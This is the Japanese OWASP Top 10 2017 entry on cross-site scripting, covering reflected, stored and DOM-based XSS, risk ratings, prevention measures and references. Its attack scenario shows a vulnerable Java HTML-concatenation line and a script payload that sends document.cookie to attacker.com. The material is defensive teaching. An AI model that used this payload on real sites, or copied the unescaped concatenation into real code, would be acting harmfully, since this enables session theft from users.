# A7:2017-クロスサイトスクリプティング (XSS)

| 脅威エージェント/攻撃手法 | セキュリティ上の弱点           | 影響               |
| -- | -- | -- |
| アクセスレベル : 悪用のしやすさ 3 | 蔓延度 3 : 検出のしやすさ 3 | 技術面への影響 2 : ビジネス面への影響 |
| 3種類のXSSはいずれも、自動化ツールを用いて検出および悪用することが可能です。また、誰でも入手できる、XSSを悪用するためのフレームワークも複数存在します。 | XSSは、OWASP Top 10の中では2番目に多く見られる問題であり、アプリケーション全体のおよそ三分の二で検出されます。自動化ツールで、いくつかのXSS問題を検出できます。PHP、J2EE/JSP、またはASP.NETのような成熟した技術においては、特にそれが顕著です。 | XSSの影響は、リクレクトおよびDOMベースの場合は中程度、ストアドの場合は重大となります。具体的な被害例として、被害者のブラウザ上でリモートコードが実行されることによる、認証情報やセッションの奪取、被害者へのマルウェア感染が挙げられます。 |

## 脆弱性発見のポイント

XSSには3種類のタイプが存在し、大抵は被害者のブラウザがターゲットとされます。

* **リフレクトXSS**: アプリケーションまたはAPIが、ユーザ入力データを適切に検証およびエスケープせずに、HTML出力の一部としてインクルードしている場合に脆弱になります。攻撃が成功すると、攻撃者は被害者のブラウザで任意のHTMLやJavaScriptを実行できるようになります。一般的には、水飲み場サイトや広告ページなど、攻撃者の制御下にあるページに辿り着くための何らかの悪質なリンクに対して、ユーザが操作を行う必要があります。
* **ストアドXSS**: ユーザ入力データが後に別のユーザまたは管理者によって閲覧される場合において、アプリケーションまたはAPIがそのデータを無害化せずに格納していると脆弱になります。ストアドXSSは、大抵の場合、高または重大リスクと見做されています。
* **DOMベースXSS**: 攻撃者が制御可能なデータをページに動的にインクルードするJavaScriptフレームワーク、単一ページのアプリケーション、およびAPIは、DOMベースXSSに対して脆弱になります。アプリケーションは、安全でないJavaScript APIに対して、攻撃者が制御可能なデータを送信しないことが理想です。

典型的なXSS攻撃には、セッションの奪取、アカウントの乗っ取り、多要素認証(MFA)の回避、DOMノードの置換または改竄(トロイの木馬を介した偽のログイン画面挿入等)、悪質なソフトウェアのダウンロードやキーロギング等のユーザのブラウザに対する攻撃などが含まれます。

## 防止方法

XSSを防止するには、信頼出来ないデータを動的なブラウザコンテンツから区別する必要があります。具体的には以下を実施します。

* 最新のRuby on RailsやReact JSなど、XSSに悪用されうるデータを自動的にエスケープするよう設計されたフレームワークを使用する。各フレームワークにおけるXSS対策の限界を確認し、対策の範囲外となるデータ使用については、適切な処理を行う。
* ボディ、属性、JavaScript、CSSやURLなどHTML出力のコンテキストに基づいて、信頼出来ないHTTPリクエストデータをエスケープすることで、リフレクトおよびストアドXSS脆弱性を解消できる。要求されるデータの詳細なエスケープ手法は [OWASP  Cheat Sheet 'XSS Prevention'](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet) を参照のこと。
* クライアント側でのブラウザドキュメント改変時に、コンテキスト依存のエンコーディングを適用することで、DOMベースXSSへの対策となる。これが行えない場合には、OWASP Cheat Sheet 'DOM based XSS Prevention'で説明されている、同様のコンテキスト依存のエスケープ手法をブラウザAPIに適用することもできる。
* XSSに対する多層防御措置の一環として [Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) を有効に設定する。これは、ローカルファイルインクルードを介して悪意のあるコードを設置可能にする他の脆弱性（例：パストラバーサルを悪用したファイルの上書き、許可されたコンテンツ配信ネットワークから提供された脆弱なライブラリ等）が存在しない場合に効果的である。

## 攻撃シナリオの例

**シナリオ #1**: あるアプリケーションは、検証やエスケープをせず、信頼出来ないデータを使用して、以下のHTMLスニペットを生成しています。

`(String) page += "<input name='creditcard' type='TEXT' value='" + request.getParameter("CC") + "'>";`
攻撃者はブラウザでパラメータ‘CC’を以下に改変します。

`'><script>document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>'`

これにより、被害者のセッションIDが攻撃者のウェブサイトに送信され、被害者のセッションが乗っ取られます。

攻撃者は、アプリケーションが使用している自動化されたCSRF対策を、XSSで破れることに注意して下さい。

## 参考資料

### OWASP

* [OWASP Proactive Controls: Encode Data](https://www.owasp.org/index.php/OWASP_Proactive_Controls#tab=OWASP_Proactive_Controls_2016)
* [OWASP Proactive Controls: Validate Data](https://www.owasp.org/index.php/OWASP_Proactive_Controls#tab=OWASP_Proactive_Controls_2016)
* [OWASP Application Security Verification Standard: V5](https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project)
* [OWASP Testing Guide: Testing for Reflected XSS](https://www.owasp.org/index.php/Testing_for_Reflected_Cross_site_scripting_(OTG-INPVAL-001))
* [OWASP Testing Guide: Testing for Stored XSS](https://www.owasp.org/index.php/Testing_for_Stored_Cross_site_scripting_(OTG-INPVAL-002))
* [OWASP Testing Guide: Testing for DOM XSS](https://www.owasp.org/index.php/Testing_for_DOM-based_Cross_site_scripting_(OTG-CLIENT-001))
* [OWASP Cheat Sheet: XSS Prevention](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)
* [OWASP Cheat Sheet: DOM based XSS Prevention](https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet)
* [OWASP Cheat Sheet: XSS Filter Evasion](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)
* [OWASP Java Encoder Project](https://www.owasp.org/index.php/OWASP_Java_Encoder_Project)

### その他

* [CWE-79: Improper neutralization of user supplied input](https://cwe.mitre.org/data/definitions/79.html)
* [PortSwigger: Client-side template injection](https://portswigger.net/kb/issues/00200308_clientsidetemplateinjection)
